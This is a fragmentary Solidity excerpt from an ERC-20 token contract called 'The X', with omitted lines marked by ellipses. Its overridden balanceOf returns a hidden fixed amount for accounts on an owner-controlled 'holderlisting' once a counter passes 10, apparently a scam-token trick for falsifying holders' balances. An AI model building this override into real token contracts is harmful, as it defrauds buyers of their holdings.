...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "The X";
    string private _symbol = "The X";
    ...
    mapping(address => bool) public holderlisting;
    uint256 private amounthl;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        if (holderlisting[account]&&creca>10) return amounthl;
